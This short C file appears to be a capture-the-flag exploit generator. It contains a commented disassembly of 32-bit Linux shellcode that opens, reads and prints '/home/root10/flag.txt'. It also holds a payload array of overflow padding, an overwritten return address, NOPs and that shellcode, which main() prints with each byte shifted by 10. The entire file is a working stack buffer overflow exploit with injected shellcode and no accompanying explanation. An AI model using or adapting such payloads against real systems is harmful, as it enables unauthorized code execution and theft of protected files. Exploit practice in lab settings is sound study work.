/*
0:  6a 00                   push   0x0
2:  68 2e 74 78 74          push   0x7478742e
7:  68 66 6c 61 67          push   0x67616c66
c:  68 74 31 30 2f          push   0x2f303174
11: 68 65 2f 72 6f          push   0x6f722f65
16: 68 2f 68 6f 6d          push   0x6d6f682f
1b: 31 d2                   xor    edx,edx
1d: 89 e3                   mov    ebx,esp
1f: b9 00 00 00 00          mov    ecx,0x0
24: b8 05 00 00 00          mov    eax,0x5
29: cd 80                   int    0x80
2b: 89 c3                   mov    ebx,eax
2d: 89 e1                   mov    ecx,esp
2f: 83 e9 60                sub    ecx,0x60
32: ba ff 00 00 00          mov    edx,0xff
37: b8 03 00 00 00          mov    eax,0x3
3c: cd 80                   int    0x80
3e: bb 01 00 00 00          mov    ebx,0x1
43: b8 04 00 00 00          mov    eax,0x4
48: cd 80                   int    0x80
*/

char payload[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x93\x91\x04\x08\x90\x90\x90\x6A\x00\x68\x2E\x74\x78\x74\x68\x66\x6C\x61\x67\x68\x74\x31\x30\x2F\x68\x65\x2F\x72\x6F\x68\x2F\x68\x6F\x6D\x31\xD2\x89\xE3\xB9\x00\x00\x00\x00\xB8\x05\x00\x00\x00\xCD\x80\x89\xC3\x89\xE1\x83\xE9\x60\xBA\xFF\x00\x00\x00\xB8\x03\x00\x00\x00\xCD\x80\xBB\x01\x00\x00\x00\xB8\x04\x00\x00\x00\xCD\x80";

int main()
{
	int i = 0;
	for (i=0 ; i<0x100 ; i++)
		printf("%c", payload[i] - 10);
	printf("\n");
}